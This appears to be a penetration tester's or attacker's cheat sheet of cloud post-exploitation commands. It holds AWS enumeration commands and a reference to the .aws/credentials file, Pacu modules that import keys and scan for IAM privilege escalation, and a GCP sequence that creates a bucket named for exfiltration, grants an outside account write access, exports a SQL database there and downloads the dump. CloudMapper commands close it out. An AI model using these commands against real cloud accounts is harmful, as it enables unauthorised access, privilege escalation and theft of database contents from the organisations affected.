## Cloud Situation Awareness AWS
aws sts get-caller-identity
aws ec2 describe-instances
aws s3 ls
aws lambda list-function
aws iam list-roles
aws iam list-users
aws logs describe-log-groups
.aws/credentials 

## PACU - Metasploit for AWS 
	import_keys jmerckle
	run iam__enum_permissions
	run iam__privesc_scan 
	
## GCP 
	gcloud sql instances list 
	gcloud sql databases list -i fm-research
	gsutil mb gs://sqlexfill
	gsutil acl ch -u jmerckle@falsimenetis.com:WRITE gs://sqlexfill
	gcloud sql export sql fm-research --database=ai gs://sqlexfill/sqldump.gz 
	gsutil cp gs://sqlexfill/sqldump.gz . 

## AWS Cloudmapper	
cloudmapper.py prepare --config config.json --account acctname 
cloudmapper.py report --config config.json --account acctname
cloudmapper.py webserver